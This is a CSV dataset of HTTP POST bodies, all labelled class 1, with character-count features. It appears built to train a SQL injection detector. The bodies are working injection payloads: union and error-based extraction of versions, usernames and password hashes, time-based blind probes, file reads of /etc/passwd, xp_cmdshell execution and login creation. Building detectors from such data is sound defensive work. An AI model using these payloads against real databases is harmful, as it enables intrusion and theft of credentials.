method,body,class,single_q,double_q,dashes,braces,spaces,badwords,path
POST," select * from users where id  =  '1' union select ||/1,version  (    )   -- 1'",1,3,0,3,2,23,5,
POST," select * from users where id  =  '1' union select +\.,@@VERSION -- 1'",1,3,0,3,0,15,5,
POST,or 1  =  1/*,1,0,0,0,0,5,1,
POST,%27 or 1  =  1,1,0,0,0,0,6,1,
POST," select * from users where id  =  1 <@&@ union select 1,version  (    )   -- 1",1,0,0,3,2,24,5,
POST," select * from users where id  =  '1' union select $*$,@@VERSION -- 1'",1,3,0,3,0,15,5,
POST,"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115, ...",1,0,0,0,3,13,0,
POST," select * from users where id  =  '1' or $ 1  =  1 union select 1,@@VERSION -- 1'",1,3,0,3,0,22,6,
POST,select * from users where id  =  1 or \.<1 or 1  =  1 -- 1,1,0,0,3,0,19,5,
POST," select * from users where id  =  '1' or \<\ union select 1,@@VERSION -- 1'",1,3,0,3,0,17,6,
POST," select * from users where id  =  1 union select 1||1,version  (    )   -- 1",1,0,0,3,2,23,5,
POST," select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",1,0,0,3,0,24,7,
POST,select * from users where id  =  '1' or \.<\ or 1  =  1 -- 1',1,3,0,3,0,19,5,
POST," select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1",1,0,2,3,0,20,5,
POST," select * from users where id  =  1 or "".@"" or 1  =  1 -- 1",1,0,2,3,0,20,5,
POST," select * from users where id  =  1 or ""$["" or 1  =  1 -- 1",1,0,2,3,0,20,5,
POST,or 1 --',1,1,0,3,0,2,1,
POST," select * from users where id  =  1 or "",;"" or 1  =  1 -- 1",1,0,2,3,0,20,5,
POST,"admin"" or 1  =  1#",1,0,1,0,0,6,1,
POST," select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1",1,0,0,3,2,32,7,
POST,\x27UNION SELECT,1,0,0,0,0,1,1,
POST,PRINT,1,0,0,0,0,0,0,
POST," select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'",1,3,0,3,2,23,5,
POST,or 1  =  1--,1,0,0,3,0,5,1,
POST,1 or pg_sleep  (  __TIME__  )  --,1,0,0,3,2,10,1,
POST," select * from users where id  =  1 or "",#"" or 1  =  1 -- 1",1,0,2,3,0,20,5,
POST,admin'  )   or   (  '1'  =  '1'/*,1,5,0,0,2,14,1,
POST,or 2 between 1 and 3,1,0,0,0,0,5,3,
POST," select * from users where id  =  1 or ""  )  .""  =  1 or 1  =  1 -- 1",1,0,2,3,1,28,5,
POST," select * from users where id  =  1 or 1#"". union select null,version  (    )   -- 1",1,0,1,3,2,25,6,
POST,admin' or '1'  =  '1,1,4,0,0,0,6,1,
POST, if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --,1,4,0,3,2,17,3,
POST," select * from users where id  =  1 union select 1,banner from v$version where rownum  =  1 -- 1",1,0,0,3,0,23,7,
POST,""" or 0  =  0 --",1,0,1,3,0,7,1,
POST," select * from users where id  =  1 union select @ $_,version  (    )   -- 1",1,0,0,3,2,24,5,
POST,select * from users where id  =  1 <@.$ or 1  =  1 -- 1,1,0,0,3,0,18,4,
POST," select * from users where id  =  1 or ""%."" or 1  =  1 -- 1",1,0,2,3,0,20,5,
POST," select * from users where id  =  1 + $+*$ union select null,@@VERSION -- 1",1,0,0,3,0,17,5,
POST," select * from users where id  =  1 or "",."" or 1  =  1 -- 1",1,0,2,3,0,20,5,
POST,char%4039%41%2b%40SELECT,1,0,0,0,0,0,0,
POST," select * from users where id  =  1 or ""1&"" or 1  =  1 -- 1",1,0,2,3,0,20,5,
POST,admin'  )   or   (  '1'  =  '1,1,4,0,0,2,14,1,
POST,declare @s varchar   (  200  )   select @s   =   0x73656c6 ...,1,0,0,0,2,20,1,
POST,"or 0  =  0 #""",1,0,1,0,0,6,1,
POST," select * from users where id  =  1 or "".]"" or 1  =  1 -- 1",1,0,2,3,0,20,5,
POST,  )   or   (  'x'  =  'x,1,3,0,0,2,14,1,
POST," select * from users where id  =  1.<@$ union select 1,version  (    )   -- 1",1,0,0,3,2,23,5,
POST,$  (  sleep 50  ) ,1,0,0,0,2,8,1,
POST," select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1",1,0,0,3,0,24,7,
POST,"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype   =   'u' --",1,2,0,3,0,15,5,
POST," select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1",1,2,1,3,2,25,6,
POST," select * from users where id  =  1 or 1#""; union select null,version  (    )   -- 1",1,0,1,3,2,25,6,
POST," select * from users where id  =  1 or 1#""? or 1  =  1 -- 1",1,0,1,3,0,20,5,
POST,"""a"""" or 1  =  1--""",1,0,4,3,0,6,1,
POST," select * from users where id  =  1 *1 union select 1,banner from v$version where rownum  =  1 -- 1",1,0,0,3,0,24,7,
POST," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1,3,0,0,10,71,12,
POST," select * from users where id  =  '1' union select   (  \  )  ,@@VERSION -- 1'",1,3,0,3,2,23,5,
POST,1 and user_name  (    )     =   'dbo',1,2,0,0,2,16,1,
POST,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",1,2,0,3,6,35,3,
POST," select * from users where id  =  1 or 1#""$ union select 1,version  (    )   -- 1",1,0,1,3,2,25,6,
POST," select * from users where id  =  1 or 1#""{ union select null,version  (    )   -- 1",1,0,1,3,2,25,6,
POST,select * from users where id  =  '1' *$ . or 1  =  1 -- 1',1,3,0,3,0,19,4,
POST,select * from users where id  =  1 +$+. or 1  =  1 -- 1,1,0,0,3,0,18,4,
POST,select * from users where id  =  1 or   (  \+  )    =  1 or 1  =  1 -- 1,1,0,0,3,2,31,5,
POST," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1,3,0,0,10,71,12,
POST,or 1  =  1 or ''  =  ',1,3,0,0,0,11,2,
POST,select * from users where id  =  1   or 1  =  1 -- 1,1,0,0,3,0,19,4,
POST,or 'text' > 't',1,4,0,0,0,3,1,
POST,"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",1,0,4,0,0,12,4,
POST," select * from users where id  =  1 or ""%["" or 1  =  1 -- 1",1,0,2,3,0,20,5,
POST," select * from users where id  =  1 or 1#"";  =  1 union select 1,version  (    )   -- 1",1,0,1,3,2,29,6,
POST,admin' or '1'  =  '1'#,1,5,0,0,0,6,1,
POST,select * from users where id  =  1 +$ 1 or 1  =  1 -- 1,1,0,0,3,0,19,4,
POST,s,1,0,0,0,0,0,0,
POST," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1,3,0,0,10,71,12,
POST, select * from information_schema.tables--,1,0,0,3,0,4,2,
POST," select * from users where id  =  1 or ""$&"" or 1  =  1 -- 1",1,0,2,3,0,20,5,
POST,1   )    )    or pg_sleep  (  __TIME__  )  --,1,0,0,3,4,20,1,
POST," select * from users where id  =  '1' union select !<@,version  (    )   -- 1'",1,3,0,3,2,23,5,
POST,declare @q nvarchar   (  200  )   select @q   =   0x770061 ...,1,0,0,0,2,20,1,
POST, or 1  =  1 or ''  =  ',1,3,0,0,0,12,2,
POST,select * from users where id  =  1 %!<1 or 1  =  1 -- 1,1,0,0,3,0,18,4,
POST,declare @q nvarchar   (  200  )   select @q   =   0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec  (  @q  ) ,1,0,0,0,4,27,1,
POST," select * from users where id  =  1 or ""]1"" or 1  =  1 -- 1",1,0,2,3,0,20,5,
POST," select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1",1,0,0,3,0,17,6,
POST,or 'unusual'   =   'unusual',1,4,0,0,0,7,1,
POST, or 1 in   (  select @@version  )  --,1,0,0,3,2,13,3,
POST,truncate,1,0,0,0,0,0,1,
POST,as,1,0,0,0,0,0,1,
POST, or 3  =  3 --,1,0,0,3,0,7,1,
POST," select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1",1,0,0,3,0,24,7,
POST," select * from users where id  =  1 <@$$ union select 1,version  (    )   -- 1",1,0,0,3,2,24,5,
POST,"admin""  )   or   (  ""1""  =  ""1",1,0,4,0,2,14,1,
POST," select * from users where id  =  1 or 1#""@ union select 'a',version  (    )   -- 1",1,2,1,3,2,25,6,
POST,"1  )   or benchmark  (  10000000,MD5  (  1   )    )   #",1,0,0,0,5,24,2,
POST," select * from users where id  =  1 union select .1_,version  (    )   -- 1",1,0,0,3,2,23,5,
POST, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.DATABASE_NAME FROM DUAL   )    )    AND 'i'  =  'i,1,3,0,0,4,35,4,
POST," or 0  =  0 #""",1,0,1,0,0,7,1,
POST,select * from users where id  =  1 %$ 1 or 1  =  1 -- 1,1,0,0,3,0,19,4,
POST,select * from users where id  =  1 %!<@ or 1  =  1 -- 1,1,0,0,3,0,18,4,
POST,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",1,2,0,3,6,35,3,
POST,1  )   or sleep  (  __TIME__  )  #,1,0,0,0,3,14,2,
POST," select * from users where id  =  1 or ""1_"" or 1  =  1 -- 1",1,0,2,3,0,20,5,
POST," select * from users where id  =  1 <1## union select 1,version  (    )   -- 1",1,0,0,3,2,24,5,
POST," select * from users where id  =  1 + $+*\ union select null,@@VERSION -- 1",1,0,0,3,0,17,5,
POST,select * from users where id  =  1. <@ or 1  =  1 -- 1,1,0,0,3,0,18,4,
POST, or true--,1,0,0,3,0,2,1,
POST, execute immediate 'sel' || 'ect us' || 'er',1,6,0,0,0,8,0,
POST,hi' or 'x'  =  'x',1,5,0,0,0,6,1,
POST,select * from users where id  =  1 <@ or 1  =  1 -- 1,1,0,0,3,0,18,4,
POST," select * from users where id  =  1 or "".,"" or 1  =  1 -- 1",1,0,2,3,0,20,5,
POST,admin' #,1,1,0,0,0,1,0,
POST," select * from users where id  =  1 <@$_ union select 1,version  (    )   -- 1",1,0,0,3,2,24,5,
POST," select * from users where id  =  1 or "",  (  "" or 1  =  1 -- 1",1,0,2,3,1,24,5,
POST," select * from users where id  =  1 or "",{"" or 1  =  1 -- 1",1,0,2,3,0,20,5,
POST," union select 1,load_file  (  '/etc/passwd'  )  ,1,1,1;",1,2,0,0,2,11,2,
POST,"""  )  ;waitfor delay '0:0:__TIME__'--",1,2,1,3,1,6,1,
POST, or 'unusual'   =   'unusual',1,4,0,0,0,8,1,
POST,"insert into mysql.user   (  user, host, password  )   values   (  'name', 'localhost', password  (  'pass123'   )    )   ",1,6,0,0,6,35,1,
POST,"admin"" or ""1""  =  ""1""/*",1,0,5,0,0,6,1,
POST," select * from users where id  =  1 or ""1  (  ""  =  1 or 1  =  1 -- 1",1,0,2,3,1,28,5,
POST," select * from users where id  =  1 or \<1 union select 1,@@VERSION -- 1",1,0,0,3,0,17,6,
POST,like,1,0,0,0,0,0,1,
POST,or username like char  (  37  )  ,1,0,0,0,2,11,2,
POST, )    )    or pg_sleep  (  __TIME__  )  --,1,0,0,3,4,18,1,
POST,select * from users where id  =  1 or $+<\ or 1  =  1 -- 1,1,0,0,3,0,19,5,
POST,or 3  =  3,1,0,0,0,0,5,1,
POST," select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",1,0,2,3,1,24,5,
POST,select * from users where id  =  1 or   (  $+  )    =  1 or 1  =  1 -- 1,1,0,0,3,2,31,5,
POST,exec sp,1,0,0,0,0,1,0,
POST," select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1",1,0,0,3,0,17,6,
POST,select * from users where id  =  1 or \<$ or 1  =  1 -- 1,1,0,0,3,0,19,5,
POST," select * from users where id  =  1.&&1 union select 1,version  (    )   -- 1",1,0,0,3,2,23,5,
POST,admin' or 1  =  1/*,1,1,0,0,0,6,1,
POST,a' waitfor delay '0:0:10'--,1,3,0,3,0,3,2,
POST," select * from users where id  =  1 +  (  \  )   union select null,@@VERSION -- 1",1,0,0,3,2,24,5,
POST," select * from users where id  =  1 union select .1$_,version  (    )   -- 1",1,0,0,3,2,23,5,
POST,and 1 in   (  select var from temp  )  --,1,0,0,3,2,14,4,
POST,hi'  )   or   (  'a'  =  'a,1,4,0,0,2,14,1,
POST," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",1,3,0,0,10,71,12,
POST,"admin"" or 1  =  1",1,0,1,0,0,6,1,
POST,"""  )   or true--",1,0,1,3,1,6,1,
POST," select * from users where id  =  '1' or $ .  =  1 union select 1,@@VERSION -- 1'",1,3,0,3,0,22,6,
POST," select * from users where id  =  1 or ""  (  {"" or 1  =  1 -- 1",1,0,2,3,1,24,5,
POST,1  )   or pg_sleep  (  __TIME__  )  --,1,0,0,3,3,14,1,
POST," select * from users where id  =  1 or ""{."" or 1  =  1 -- 1",1,0,2,3,0,20,5,
POST,"""  )   or sleep  (  __TIME__  )    =  """,1,0,2,0,3,18,2,
POST,select * from users where id  =  1.<@. or 1  =  1 -- 1,1,0,0,3,0,17,4,
POST,"admin""  )   or   (  ""1""  =  ""1""--",1,0,5,3,2,14,1,
POST," select * from users where id  =  1<@.. union select 1,version  (    )   -- 1",1,0,0,3,2,23,5,
POST, exec xp_regread,1,0,0,0,0,2,0,
POST," select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1'",1,3,0,3,2,26,5,
POST,select * from users where id  =  1 + \+%1 or 1  =  1 -- 1,1,0,0,3,0,19,4,
POST," select * from users where id  =  1 or "";1"" or 1  =  1 -- 1",1,0,2,3,0,20,5,
POST," select * from users where id  =  1 or ""%&"" or 1  =  1 -- 1",1,0,2,3,0,20,5,
POST,1 and 1  =  1,1,0,0,0,0,6,1,
POST,or 0  =  0 #,1,0,0,0,0,6,1,
POST,union select * from users where login   =   char ...,1,0,0,0,0,13,4,
POST," select * from users where id  =  1 union select 1||@,version  (    )   -- 1",1,0,0,3,2,23,5,
POST,admin'  )   or '1'  =  '1'--,1,5,0,3,1,10,1,
POST,SELECT *,1,0,0,0,0,1,1,
POST," select * from users where id  =  1 or ""{;"" or 1  =  1 -- 1",1,0,2,3,0,20,5,
POST,x' and 1  =    (  select count  (  *  )   from tabname  )  --,1,1,0,3,4,25,4,
POST," select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",1,3,2,3,2,25,6,
POST," select * from users where id  =  1 or ""?,"" or 1  =  1 -- 1",1,0,2,3,0,20,5,
POST," select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'",1,3,0,3,0,24,7,
POST,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",1,0,0,0,4,20,2,
POST,procedure,1,0,0,0,0,0,0,
POST,or ''  =  ',1,3,0,0,0,5,1,
POST, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.LOGIN_USER FROM DUAL   )    )    AND 'i'  =  'i,1,3,0,0,4,35,4,
POST," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1,3,0,0,10,71,12,
POST, desc users /*,1,0,0,0,0,3,0,
POST," select * from users where id  =  1 or   (  \.  )    =  1 union select 1,@@VERSION -- 1",1,0,0,3,2,29,6,
POST,select * from users where id  =  '1' or $ 1  =  1 or 1  =  1 -- 1',1,3,0,3,0,24,5,
POST,""" or """"^""",1,0,4,0,0,2,1,
POST,"""-""",1,0,2,1,0,0,0,
POST," select * from users where id  =  1 or \<   =  1 union select 1,@@VERSION -- 1",1,0,0,3,0,22,6,
POST," select * from users where id  =  1 union select 1<@$,version  (    )   -- 1",1,0,0,3,2,23,5,
POST," select * from users where id  =  1 *\ union select null,@@VERSION -- 1",1,0,0,3,0,16,5,
POST," select * from users where id  =  '1' or !<@ union select 1,version  (    )   -- 1'",1,3,0,3,2,25,6,
POST," select * from users where id  =  1 or "".%"" or 1  =  1 -- 1",1,0,2,3,0,20,5,
POST,admin'/*,1,1,0,0,0,0,0,
POST," select * from users where id  =  1 or ""  (  #"" or 1  =  1 -- 1",1,0,2,3,1,24,5,
POST,||UTL_HTTP.REQUEST,1,0,0,0,0,0,0,
POST," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",1,3,0,0,10,71,12,
POST," select * from users where id  =  '1'<@.. union select 1,version  (    )   -- 1'",1,3,0,3,2,23,5,
POST,"""   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",1,0,1,0,6,30,2,
POST," select * from users where id  =  1 <@.$ union select 1,version  (    )   -- 1",1,0,0,3,2,24,5,
POST," select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",1,0,0,3,0,22,6,
POST,select * from users where id  =  '1' <@.$ or 1  =  1 -- 1',1,3,0,3,0,18,4,
POST,1 uni/**/on select all from where,1,0,0,0,0,5,4,
POST," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",1,0,0,3,0,17,5,
POST," select * from users where id  =  1 or 1#""? union select null,version  (    )   -- 1",1,0,1,3,2,25,6,
POST,admin'  )   or '1'  =  '1'#,1,5,0,0,1,10,1,
POST,||utl_http.request  (  'httP://192.168.1.1/'  )  ||',1,3,0,0,2,8,0,
POST,or '7659'  =  '7659,1,3,0,0,0,5,1,
POST," select * from users where id  =  1 or ""{@"" or 1  =  1 -- 1",1,0,2,3,0,20,5,
POST," select * from users where id  =  1 union select +!<1,version  (    )   -- 1",1,0,0,3,2,23,5,
POST," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1,3,0,0,10,77,13,
POST," select * from users where id  =  1 or ""  (  @"" or 1  =  1 -- 1",1,0,2,3,1,24,5,
POST,or true--,1,0,0,3,0,1,1,
POST," select * from users where id  =  1 union select !<1,version  (    )   -- 1",1,0,0,3,2,23,5,
POST," select * from users where id  =  '1' union select \#,@@VERSION -- 1'",1,3,0,3,0,15,5,
POST," select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1",1,0,1,3,2,25,6,
POST,""" or true--",1,0,1,3,0,2,1,
POST,select * from users where id  =  1. or 1  =  1 -- 1,1,0,0,3,0,17,4,
POST," select * from users where id  =  1 or @#"",  =  1 union select 1,version  (    )   -- 1",1,0,1,3,2,29,6,
POST," select * from users where id  =  1 or "";@"" or 1  =  1 -- 1",1,0,2,3,0,20,5,
POST,â or 3  =  3 --,1,0,0,3,0,7,1,
POST, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT global_name FROM global_name   )    )    AND 'i'  =  'i,1,3,0,0,4,35,4,
POST," select * from users where id  =  1 +1 union select null,banner from v$version where rownum  =  1 -- 1",1,0,0,3,0,24,7,
POST," select * from users where id  =  1 or "",,""  =  1 or 1  =  1 -- 1",1,0,2,3,0,24,5,
POST," select * from users where id  =  1 + $+%1 union select null,@@VERSION -- 1",1,0,0,3,0,17,5,
POST," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",1,0,1,3,4,33,6,
POST," select * from users where id  =  1 or ""  )  1"" or 1  =  1 -- 1",1,0,2,3,1,24,5,
POST, or uid like '%,1,1,0,0,0,4,3,
POST,select * from users where id  =  '1' <@&1 or 1  =  1 -- 1',1,3,0,3,0,18,4,
POST," select * from users where id  =  '1' union select !<1,version  (    )   -- 1'",1,3,0,3,2,23,5,
POST,23 or 1  =  1 --,1,0,0,3,0,7,1,
POST," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",1,0,0,3,0,17,6,
POST," select * from users where id  =  1 or ""{  (  ""  =  1 or 1  =  1 -- 1",1,0,2,3,1,28,5,
POST," select * from users where id  =  1 or ""%_"" or 1  =  1 -- 1",1,0,2,3,0,20,5,
POST,select * from users where id  =  1 +   (  \.  )   or 1  =  1 -- 1,1,0,0,3,2,27,4,
POST," select * from users where id  =  '1' union select \,@@VERSION -- 1'",1,3,0,3,0,15,5,
POST,0 or 1  =  1,1,0,0,0,0,6,1,
POST,select * from users where id  =  1 &@ or 1  =  1 -- 1,1,0,0,3,0,18,4,
POST,"admin""  )   or ""1""  =  ""1",1,0,4,0,1,10,1,
POST,select * from users where id  =  1 or \<   =  1 or 1  =  1 -- 1,1,0,0,3,0,24,5,
POST," select * from users where id  =  1 or ""??"" or 1  =  1 -- 1",1,0,2,3,0,20,5,
POST," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1,3,0,0,10,71,12,
POST," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1,3,0,0,10,71,12,
POST,&apos OR,1,0,0,0,0,1,1,
POST,sqlvuln,1,0,0,0,0,0,0,
POST,select * from users where id  =  1 + $+%$ or 1  =  1 -- 1,1,0,0,3,0,19,4,
POST,select * from users where id  =  '1' + $+%\ or 1  =  1 -- 1',1,3,0,3,0,19,4,
POST,""" or """"*""",1,0,4,0,0,2,1,
POST,"hi or 1  =  1 --""",1,0,1,3,0,7,1,
POST," select * from users where id  =  1. union select null,banner from v$version where rownum  =  1 -- 1",1,0,0,3,0,23,7,
POST, exec master..xp_cmdshell 'ping 172.10.1.255'--,1,2,0,3,0,4,0,
POST," select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",1,3,0,3,0,29,8,
POST," select * from users where id  =  '1' union select ""?""_,version  (    )   -- 1'",1,3,2,3,2,23,5,
POST,select * from information_schema.tables--,1,0,0,3,0,3,2,
POST,select * from users where id  =  1 or \<\. or 1  =  1 -- 1,1,0,0,3,0,19,5,
POST,   (  select top 1,1,0,0,0,1,7,1,
POST,Ã½ or 1  =  1 --,1,0,0,3,0,7,1,
POST,a' --,1,1,0,3,0,1,0,
POST, or 1  =  1 /*,1,0,0,0,0,7,1,
POST," select * from users where id  =  1 or 1#"", union select null,version  (    )   -- 1",1,0,1,3,2,25,6,
POST," select * from users where id  =  '1' union select $ .,@@VERSION -- 1'",1,3,0,3,0,16,5,
POST,--,1,0,0,3,0,0,0,
POST,"exec sp_addlogin 'name' , 'password'",1,4,0,0,0,4,0,
POST," select * from users where id  =  1   union select null,banner from v$version where rownum  =  1 -- 1",1,0,0,3,0,25,7,
POST,0x77616974666F722064656C61792027303A303A31302700 exec  (  @s  ) ,1,0,0,0,2,8,0,
POST," select * from users where id  =  1 or "".  )  "" or 1  =  1 -- 1",1,0,2,3,1,24,5,
